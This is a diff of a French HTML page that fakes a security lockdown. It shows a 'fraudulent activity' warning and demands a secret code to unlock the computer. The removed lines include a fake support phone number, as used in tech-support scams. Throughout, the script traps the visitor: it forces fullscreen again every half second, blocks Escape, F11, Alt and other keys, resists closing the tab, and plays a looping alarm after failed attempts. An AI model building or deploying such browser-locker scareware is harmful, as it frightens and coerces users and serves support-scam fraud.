@@ -1,5 +1,4 @@
-<!DOCTYPE html>
-<html lang="fr">
+<!DOCTYPE html><html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -11,7 +10,6 @@
             box-sizing: border-box;
             font-family: Arial, sans-serif;
         }
-
         html, body {
             width: 100%;
             height: 100%;
@@ -22,32 +20,28 @@
             align-items: center;
             text-align: center;
             overflow: hidden;
-            cursor: none; /* Cache le curseur */
+            cursor: none;
         }
-
         .container {
             background: red;
             padding: 5%;
             border-radius: 10px;
             box-shadow: 0 0 10px white;
-            width: 80vw; /* Utilise 80% de la largeur de l'écran */
-            height: 80vh; /* Utilise 80% de la hauteur de l'écran */
+            width: 80vw;
+            height: 80vh;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
         }
-
         h1 {
-            font-size: 5vw; /* Ajustement dynamique */
+            font-size: 5vw;
             margin-bottom: 2vh;
         }
-
         #alert-message {
-            font-size: 3vw; /* Ajustement dynamique */
+            font-size: 3vw;
             margin-bottom: 3vh;
         }
-
         input {
             padding: 1vh;
             font-size: 3vw;
@@ -56,7 +50,6 @@
             outline: none;
             width: 50%;
         }
-
         button {
             background: black;
             color: white;
@@ -64,7 +57,6 @@
             font-size: 3vw;
             cursor: pointer;
         }
-
         #error-message {
             color: yellow;
             font-size: 2vw;
@@ -79,136 +71,86 @@
             🚨 <b>SUSPICION D’ACTIVITÉ FRAUDULEUSE</b> 🚨<br>
             Votre ordinateur est verrouillé pour des raisons de **sécurité**.<br>
             Veuillez **entrer le code secret** pour déverrouiller.<br>
-            <b>☎ Assistance : +44 741 30 52 610</b>
         </p>
         <input type="password" id="codeInput" placeholder="Entrez le code secret..." autofocus>
         <button onclick="checkCode()">Déverrouiller</button>
         <p id="error-message"></p>
     </div>
-
     <script>
-        // 🔒 Codes secrets autorisés
         const SECRET_CODES = ["dakar", "2012", "1234"];
         let attempts = 0;
-        const maxAttempts = 3;
+        const maxAttempts = 3;function startLockdown() {
+        requestFullScreen();
+        blockKeys();
+        preventClose();
+        document.getElementById("codeInput").focus();
+    }
 
-        // 🚀 Démarrer le verrouillage
-        function startLockdown() {
-            forceMaxResolution();
-            requestFullScreen();
-            blockKeys();
-            preventClose();
-            lockMouse();
-            setTimeout(() => {
-                document.getElementById("codeInput").focus();
-            }, 500);
-        }
-
-        // 🔐 Vérifier le code
-        function checkCode() {
-            let inputCode = document.getElementById("codeInput").value.toLowerCase();
-            
-            if (SECRET_CODES.includes(inputCode)) {
-                unlockSystem();
-            } else {
-                attempts++;
-                document.getElementById("error-message").textContent = `⛔ Code incorrect (${attempts}/${maxAttempts})`;
-                
-                if (attempts >= maxAttempts) {
-                    playAlarm();
-                }
+    function checkCode() {
+        let inputCode = document.getElementById("codeInput").value.toLowerCase();
+        if (SECRET_CODES.includes(inputCode)) {
+            unlockSystem();
+        } else {
+            attempts++;
+            document.getElementById("error-message").textContent = `⛔ Code incorrect (${attempts}/${maxAttempts})`;
+            if (attempts >= maxAttempts) {
+                playAlarm();
             }
         }
+    }
 
-        // 📌 Forcer la plus grande résolution possible
-        function forceMaxResolution() {
-            document.documentElement.style.width = "100vw";
-            document.documentElement.style.height = "100vh";
-            document.body.style.width = "100vw";
-            document.body.style.height = "100vh";
+    function requestFullScreen() {
+        let elem = document.documentElement;
+        if (elem.requestFullscreen) {
+            elem.requestFullscreen();
+        } else if (elem.mozRequestFullScreen) {
+            elem.mozRequestFullScreen();
+        } else if (elem.webkitRequestFullscreen) {
+            elem.webkitRequestFullscreen();
+        } else if (elem.msRequestFullscreen) {
+            elem.msRequestFullscreen();
         }
+    }
 
-        // 🛑 Forcer le plein écran
-        function requestFullScreen() {
-            let elem = document.documentElement;
-            if (elem.requestFullscreen) {
-                elem.requestFullscreen();
-            } else if (elem.mozRequestFullScreen) {
-                elem.mozRequestFullScreen();
-            } else if (elem.webkitRequestFullscreen) {
-                elem.webkitRequestFullscreen();
-            } else if (elem.msRequestFullscreen) {
-                elem.msRequestFullscreen();
-            }
-        }
-
-        // 🚨 Bloquer les touches spéciales sauf Entrée et le pavé numérique
-        function blockKeys() {
-            document.addEventListener("keydown", function (event) {
-                let blockedKeys = [
-                    "Escape", "F11", "F5", "F12", "Tab", "Control", "Alt", "Meta",
-                    "Shift", "Delete", "ArrowUp", "ArrowDown", "ArrowLeft", "ArrowRight"
-                ];
-
-                if (blockedKeys.includes(event.key)) {
-                    event.preventDefault();
-                }
-
-                if (event.key === "Enter") {
-                    checkCode();
-                }
-            });
-        }
-
-        // 🔊 Jouer une alarme après 3 erreurs
-        function playAlarm() {
-            let audio = new Audio("https://freesound.org/data/previews/411/411091_5121236-lq.mp3");
-            audio.loop = true;
-            audio.play();
-        }
-
-        // 🔓 Déverrouiller l'écran
-        function unlockSystem() {
-            document.exitFullscreen();
-            document.body.innerHTML = "<h1 style='color: green;'>✅ Accès Rétabli</h1>";
-        }
-
-        // ❌ Empêcher la fermeture et re-forcer le plein écran immédiatement
-        function preventClose() {
-            window.onbeforeunload = function() {
-                return "🚨 Attention ! Cette action peut provoquer une perte de données.";
-            };
-
-            document.addEventListener("visibilitychange", function() {
-                if (document.hidden) {
-                    setTimeout(requestFullScreen, 10);
-                }
-            });
-
-            setInterval(() => {
-                if (!document.fullscreenElement) {
-                    requestFullScreen();
-                }
-            }, 100);
-        }
-
-        // 🖱️ Bloquer la souris en haut à droite
-        function lockMouse() {
-            document.addEventListener("mousemove", function(event) {
+    function blockKeys() {
+        document.addEventListener("keydown", function (event) {
+            let blockedKeys = ["Escape", "F11", "F12", "Tab", "Control", "Alt", "Meta", "Shift", "Delete"];
+            if (blockedKeys.includes(event.key)) {
                 event.preventDefault();
-                window.scrollTo(0, 0);
-                
-                let fakeCursor = document.createElement("div");
-                fakeCursor.style.position = "fixed";
-                fakeCursor.style.top = "0px";
-                fakeCursor.style.right = "0px";
-                fakeCursor.style.width = "10px";
-                fakeCursor.style.height = "10px";
-                fakeCursor.style.zIndex = "9999";
-                fakeCursor.style.background = "transparent";
-                document.body.appendChild(fakeCursor);
-            });
-        }
-    </script>
+            }
+            if (event.key === "Enter") {
+                checkCode();
+            }
+        });
+    }
+
+    function playAlarm() {
+        let audio = new Audio("https://www.soundjay.com/button/beep-07.wav");
+        audio.loop = true;
+        audio.play();
+    }
+
+    function unlockSystem() {
+        document.exitFullscreen();
+        document.body.innerHTML = "<h1 style='color: green;'>✅ Accès Rétabli</h1>";
+    }
+
+    function preventClose() {
+        window.onbeforeunload = function() {
+            return "🚨 Attention ! Cette action peut provoquer une perte de données.";
+        };
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                setTimeout(requestFullScreen, 10);
+            }
+        });
+        setInterval(() => {
+            if (!document.fullscreenElement) {
+                requestFullScreen();
+            }
+        }, 500);
+    }
+</script>
+
 </body>
 </html>
